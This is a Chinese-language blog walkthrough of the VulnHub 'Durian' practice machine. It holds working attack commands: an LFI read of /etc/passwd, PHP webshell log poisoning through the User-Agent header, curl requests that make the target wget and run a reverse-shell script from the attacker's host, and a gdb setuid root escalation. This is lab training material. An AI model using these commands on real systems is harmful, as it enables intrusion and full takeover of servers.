@@ -1,0 +1,673 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="X_T" href="http://n1h1l157.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="X_T" href="http://n1h1l157.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="X_T" href="http://n1h1l157.github.io/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="VULNHUB 41-50" />
+
+
+<link rel="canonical" href="http://n1h1l157.github.io/2023/07/01/VULNHUB/149%20DURIAN/">
+
+
+
+  <title>
+VULNHUB DURIAN - VULNHUB |
+Phut Hon = X_T = 天行健，君子以自强不息</title>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">VULNHUB DURIAN
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2023-07-01 14:06:58">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2023-07-01T14:06:58+08:00">2023-07-01</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">Phut Hon</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/BYav6pSg8e1GqNH.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/I2FJTgzYkwqh7rd.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/VHIxW2qc1oAMOef.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/gs6XxBVA1FQvmG4.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/eZcPaFH4pt9Cx8k.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/SqEelpzx4BXNZvg.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/VULNHUB/" itemprop="item" rel="index" title="分类于 VULNHUB"><span itemprop="name">VULNHUB</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="http://n1h1l157.github.io/2023/07/01/VULNHUB/149%20DURIAN/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content=".N1h1l157">
+    <meta itemprop="description" content="天行健，君子以自强不息, 人生如逆旅，我亦是行人">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="X_T">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <p>靶机下载地址: <span class="exturl" data-url="aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvY2VyZWFsLTEsNzAzLw==">https://www.vulnhub.com/entry/cereal-1,703/</span><br>
+ 教程链接地址: <span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTU3Nzk0MTQuaHRtbA==">https://www.cnblogs.com/sainet/p/15779414.html</span></p>
+<h3 id="001-确认攻击目标的财产信息"><a class="markdownIt-Anchor" href="#001-确认攻击目标的财产信息">#</a> 001 确认攻击目标的财产信息</h3>
+<p>攻击机 kali： 1 92.168. 0 .x (由于设置成了 DHCP、可能多变)<br>
+ 靶机 DURIAN：桥接于 1 92.168. 0 .1 的网卡，ip 未知</p>
+<p>1 ）确定靶机 ip 地址和开放的端口<br>
+由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip<br>
+sudo arp-scan -l | grep ‘a0’ | awk ‘{print $1,$2}’ | cut -d ’ ’ -f 1 | uniq</p>
+<p>sudo nmap -sVC -T4 -Pn --open -p- 192.168.0.18 8 --min-rate=5000</p>
+<h3 id="检索到的有效服务如下所示"><a class="markdownIt-Anchor" href="#检索到的有效服务如下所示">#</a> 检索到的有效服务如下所示：</h3>
+<p>22 ssh：可尝试 ssh 爆破与一些对应版本漏洞利用<br>
+ 80 、 7080 、 8000 、 8088 http：可对 web 进行渗透测试收集信息</p>
+<h3 id="002-信息收集目录爆破有效信息检索lfi漏洞测试"><a class="markdownIt-Anchor" href="#002-信息收集目录爆破有效信息检索lfi漏洞测试">#</a> 002 信息收集，目录爆破，有效信息检索，lfi 漏洞测试</h3>
+<p>打开 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjgu">http://192.168.</span> 0. 188 / 进行信息收集</p>
+<p>gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/dirb/wordlists/common.txt -u<br>
+<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMC4x">http://192.168.0.1</span> 88 /</p>
+<p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMC4xNzIvY2dpLWRhdGEv">http://192.168.0.172/cgi-data/</span></p>
+<p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMC4xNzIvY2dpLWRhdGEvZ2V0SW1hZ2UucGhw">http://192.168.0.172/cgi-data/getImage.php</span></p>
+<p>有文件包含漏洞，测试读取 /etc/passwd<br>
+view-source:<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMC4xNzIvY2dpLWRhdGEvZ2V0SW1hZ2UucGhwP2ZpbGU9Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==">http://192.168.0.172/cgi-data/getImage.php?file=../../../../../etc/passwd</span></p>
+<p>得到了两个有 bash 的用户，测试能否读取到私钥文件<br>
+ view-source:<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMC4xNzIvY2dpLQ==">http://192.168.0.172/cgi-</span><br>
+data/getImage.php?file=…/…/…/…/…/home/durian/.ssh/id_rsa</p>
+<p>没有读取到私钥文件，此 lfi 漏洞利用还需要配合其他的漏洞，如果知道了日<br>
+志文件地址，是可以尝试往日志里边写后门的</p>
+<h3 id="查看一下其他的信息获取到更多的信息"><a class="markdownIt-Anchor" href="#查看一下其他的信息获取到更多的信息">#</a> 查看一下其他的信息，获取到更多的信息</h3>
+<p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMC4xNzIvYmxvZw==">http://192.168.0.172/blog</span></p>
+<p>7080 站点有一个登陆框，但是不存在弱口令，sql 注入</p>
+<h3 id="8000-站点是一张图片需要目录收集"><a class="markdownIt-Anchor" href="#8000-站点是一张图片需要目录收集">#</a> 8000 站点是一张图片，需要目录收集</h3>
+<h3 id="没有发现什么敏感的目录信息"><a class="markdownIt-Anchor" href="#没有发现什么敏感的目录信息">#</a> 没有发现什么敏感的目录信息</h3>
+<h3 id="8088-页面也是一个图片没有什么特点"><a class="markdownIt-Anchor" href="#8088-页面也是一个图片没有什么特点">#</a> 8088 页面也是一个图片，没有什么特点</h3>
+<h3 id="搜寻目录之后发现一些特殊的目录"><a class="markdownIt-Anchor" href="#搜寻目录之后发现一些特殊的目录">#</a> 搜寻目录之后发现一些特殊的目录</h3>
+<h3 id="发现大部分页面都是-403-没有利用的价值"><a class="markdownIt-Anchor" href="#发现大部分页面都是-403-没有利用的价值">#</a> 发现大部分页面都是 403 , 没有利用的价值</h3>
+<h3 id="有一个界面有登陆框和密码可以用来爆破"><a class="markdownIt-Anchor" href="#有一个界面有登陆框和密码可以用来爆破">#</a> 有一个界面有登陆框和密码，可以用来爆破</h3>
+<h3 id="003-lfi漏洞利用寻找日志文件往日志文件中写木马"><a class="markdownIt-Anchor" href="#003-lfi漏洞利用寻找日志文件往日志文件中写木马">#</a> 003 lfi 漏洞利用，寻找日志文件，往日志文件中写木马</h3>
+<h3 id="综上是能收集到所有的信息登陆框处由于缺少用户名是很难爆破出来的"><a class="markdownIt-Anchor" href="#综上是能收集到所有的信息登陆框处由于缺少用户名是很难爆破出来的">#</a> 综上是能收集到所有的信息，登陆框处由于缺少用户名，是很难爆破出来的，</h3>
+<p>唯一有价值的线索指向了 lfi 漏洞，多次尝试之后找到了日志的路径<br>
+<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMC4xNzIvY2dpLWRhdGEvZ2V0SW1hZ2UucGhwP2ZpbGU9L3Zhci9sb2cvZHVyaWFuLmxvZy9hY2Nlc3MubG9n"> http://192.168.0.172/cgi-data/getImage.php?file=/var/log/durian.log/access.log</span></p>
+<h3 id="既然信息能够被保存在这里就给发送一个带木马的信息修改ua头"><a class="markdownIt-Anchor" href="#既然信息能够被保存在这里就给发送一个带木马的信息修改ua头">#</a> 既然信息能够被保存在这里，就给发送一个带木马的信息，修改 UA 头</h3>
+<p>这里直接用 curl 命令来写，可以用 burp 将数据转化为 curl 命令<br>
+ curl -v -X $‘GET’ -H <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi>U</mi><mi>s</mi><mi>e</mi><mi>r</mi><mo>−</mo><mi>A</mi><mi>g</mi><mi>e</mi><mi>n</mi><mi>t</mi><mo>:</mo><mi>M</mi><mi>o</mi><mi>z</mi><mi>i</mi><mi>l</mi><mi>l</mi><mi>a</mi><mi mathvariant="normal">/</mi><mn>5.0</mn><mo>&lt;</mo><mo stretchy="false">?</mo><mi>p</mi><mi>h</mi><mi>p</mi><mi>s</mi><mi>y</mi><mi>s</mi><mi>t</mi><mi>e</mi><mi>m</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">&#x27;User-Agent: Mozilla/5.0 &lt;?php system(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.835222em;vertical-align:-0.08333em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord">/</span><span class="mord">5</span><span class="mord">.</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mclose">?</span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal">p</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">m</span><span class="mopen">(</span></span></span></span>_GET[‘X_T’]); ?&gt;<br>
+(Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)<br>
+Chrome/103.0.0.0 Safari/537.36’ $‘<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMC4xODgvY2dpLQ==">http://192.168.0.188/cgi-</span><br>
+data/getImage.php?file=/var/log/durian.log/access.log&amp;X_T=whoami’</p>
+<p>并且命令被执行了，收到了 www-data 即当前用户名</p>
+<p>既然能够执行命令，那么就准备用日志来反弹 shell，准备如下代码</p>
+<p>通过修改数据报使靶机下载 kali 上准备好的反弹 shell 的代码<br>
+ GET <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMC4xODgvY2dpLQ==">http://192.168.0.188/cgi-</span><br>
+data/getImage.php?file=/var/log/durian.log/access.log&amp;X_T=wget+http://192.168.0.1<br>
+68/shell.sh±O+/var/www/html/blog/shell.sh HTTP/1.1</p>
+<h3 id="但是失败了没有下载提示也没有合适的数据报返回"><a class="markdownIt-Anchor" href="#但是失败了没有下载提示也没有合适的数据报返回">#</a> 但是失败了，没有下载提示，也没有合适的数据报返回</h3>
+<p>改为 post 的方式，写一个后门文件看看，居然写成功了，但是不知道怎么访问</p>
+<p>用 lfi 漏洞的位置访问时是无法写入任何文件的，是个假后门</p>
+<h3 id="并且也不能修改原有的所有代码"><a class="markdownIt-Anchor" href="#并且也不能修改原有的所有代码">#</a> 并且也不能修改原有的所有代码</h3>
+<h3 id="还是从数据包来下手可能下载成功了没有回显索性就直接尝试执行本应该"><a class="markdownIt-Anchor" href="#还是从数据包来下手可能下载成功了没有回显索性就直接尝试执行本应该">#</a> 还是从数据包来下手，可能下载成功了没有回显，索性就直接尝试执行本应该</h3>
+<p>下载好的文件位置的 sh 脚本，看能不能把 shell 反弹出来</p>
+<h3 id="但是没有反弹出来很奇怪"><a class="markdownIt-Anchor" href="#但是没有反弹出来很奇怪">#</a> 但是没有反弹出来，很奇怪</h3>
+<h3 id="004-防火墙策略curl自定义发包linpeas检索gdb提权"><a class="markdownIt-Anchor" href="#004-防火墙策略curl自定义发包linpeas检索gdb提权">#</a> 004 防火墙策略，curl 自定义发包，linpeas 检索，gdb 提权</h3>
+<p>试了大半天没有结果，直接重新导入靶机了，这次靶机 ip 发生变化了</p>
+<p>再次用 burp 捕获数据，思考为什么不能反弹</p>
+<p>既然可以执行命令，执行处 id 的结果，说明命令执行没有问题，但是去下载<br>
+ python 简易 web 上的程序时出错了，很有可能是防火墙的问题，果然一看，防<br>
+火墙不知道因为什么原因打开了，就一直卡住了</p>
+<h3 id="关闭防火墙再次测试"><a class="markdownIt-Anchor" href="#关闭防火墙再次测试">#</a> 关闭防火墙，再次测试</h3>
+<p>用 curl 发送数据包，下载木马<br>
+ curl -i -s -k -X $‘GET’ \</p>
+<ul>
+<li>H <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi>U</mi><mi>s</mi><mi>e</mi><mi>r</mi><mo>−</mo><mi>A</mi><mi>g</mi><mi>e</mi><mi>n</mi><mi>t</mi><mo>:</mo><mi>M</mi><mi>o</mi><mi>z</mi><mi>i</mi><mi>l</mi><mi>l</mi><mi>a</mi><mi mathvariant="normal">/</mi><mn>5.0</mn><mo>&lt;</mo><mo stretchy="false">?</mo><mi>p</mi><mi>h</mi><mi>p</mi><mi>s</mi><mi>y</mi><mi>s</mi><mi>t</mi><mi>e</mi><mi>m</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">&#x27;User-Agent: Mozilla/5.0 &lt;?php system(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.835222em;vertical-align:-0.08333em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord">/</span><span class="mord">5</span><span class="mord">.</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mclose">?</span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal">p</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">m</span><span class="mopen">(</span></span></span></span>_GET[‘y’]);?&gt; (Macintosh; Intel<br>
+Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0<br>
+Safari/537.36’ <br>
+$‘<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMC4xNzIvY2dpLQ==">http://192.168.0.172/cgi-</span><br>
+data/getImage.php?file=/var/log/durian.log/access.log&amp;y=wget+http://192.168.0.168/<br>
+shell.sh±O+/var/www/html/blog/shell1.sh’</li>
+</ul>
+<p>当看到 python 服务器上有了回馈信息后，就说明是正确的</p>
+<p>执行下载的程序，并且用来接收 shell<br>
+curl -i -s -k -X $‘GET’ \</p>
+<ul>
+<li>H <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi>U</mi><mi>s</mi><mi>e</mi><mi>r</mi><mo>−</mo><mi>A</mi><mi>g</mi><mi>e</mi><mi>n</mi><mi>t</mi><mo>:</mo><mi>M</mi><mi>o</mi><mi>z</mi><mi>i</mi><mi>l</mi><mi>l</mi><mi>a</mi><mi mathvariant="normal">/</mi><mn>5.0</mn><mo>&lt;</mo><mo stretchy="false">?</mo><mi>p</mi><mi>h</mi><mi>p</mi><mi>s</mi><mi>y</mi><mi>s</mi><mi>t</mi><mi>e</mi><mi>m</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">&#x27;User-Agent: Mozilla/5.0 &lt;?php system(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.835222em;vertical-align:-0.08333em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord">/</span><span class="mord">5</span><span class="mord">.</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mclose">?</span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal">p</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">m</span><span class="mopen">(</span></span></span></span>_GET[‘y’]);?&gt; (Macintosh; Intel<br>
+Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0<br>
+Safari/537.36’ <br>
+$‘<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMC4xNzIvY2dpLQ==">http://192.168.0.172/cgi-</span><br>
+data/getImage.php?file=/var/log/durian.log/access.log&amp;y=bash+/var/www/html/blog/<br>
+<span class="exturl" data-url="aHR0cDovL3NoZWxsMS5zaA==">shell1.sh</span>’</li>
+</ul>
+<p>成功拿到网站权限，开始提权，<span class="exturl" data-url="aHR0cDovL3huLS1saW5wZWFzLTR0M2tnbXM0YTQxNHAuc2g=">放了一个 linpeas.sh</span>, 查到 gdb 权限设置错误</p>
+<p>参照 gtfobin，直接提权为 root 用户<br>
+ gdb -nx -ex ‘python import os; os.setuid (0)’ -ex ‘!sh’ -ex quit</p>
+<p>–&gt; 成功拿到了 root 权限</p>
+
+      <div class="tags">
+          <a href="/tags/VULNHUB-41-50/" rel="tag"><i class="ic i-tag"></i> VULNHUB 41-50</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2023-07-01 14:28:55" itemprop="dateModified" datetime="2023-07-01T14:28:55+08:00">2023-07-01</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
+  <p>请我喝[茶]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt=".N1h1l157 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt=".N1h1l157 支付宝">
+        <p>支付宝</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt=".N1h1l157 贝宝">
+        <p>贝宝</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>.N1h1l157 <i class="ic i-at"><em>@</em></i>X_T
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="http://n1h1l157.github.io/2023/07/01/VULNHUB/149%20DURIAN/" title="VULNHUB DURIAN">http://n1h1l157.github.io/2023/07/01/VULNHUB/149 DURIAN/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2023/07/01/VULNHUB/144%20CEREAL/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;2fd4OmPLVlHYoaK.jpg" title="VULNHUB CEREAL">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> VULNHUB</span>
+  <h3>VULNHUB CEREAL</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2023/07/01/VULNHUB/150%20POWERGRID/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;NxsmFbBQptiHlCW.jpg" title="VULNHUB POWERGRID">
+  <span class="type">下一篇</span>
+  <span class="category"><i class="ic i-flag"></i> VULNHUB</span>
+  <h3>VULNHUB POWERGRID</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#001-%E7%A1%AE%E8%AE%A4%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87%E7%9A%84%E8%B4%A2%E4%BA%A7%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text"> 001 确认攻击目标的财产信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E7%B4%A2%E5%88%B0%E7%9A%84%E6%9C%89%E6%95%88%E6%9C%8D%E5%8A%A1%E5%A6%82%E4%B8%8B%E6%89%80%E7%A4%BA"><span class="toc-number">2.</span> <span class="toc-text"> 检索到的有效服务如下所示：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#002-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4%E6%9C%89%E6%95%88%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2lfi%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95"><span class="toc-number">3.</span> <span class="toc-text"> 002 信息收集，目录爆破，有效信息检索，lfi 漏洞测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%B8%80%E4%B8%8B%E5%85%B6%E4%BB%96%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E5%88%B0%E6%9B%B4%E5%A4%9A%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-number">4.</span> <span class="toc-text"> 查看一下其他的信息，获取到更多的信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 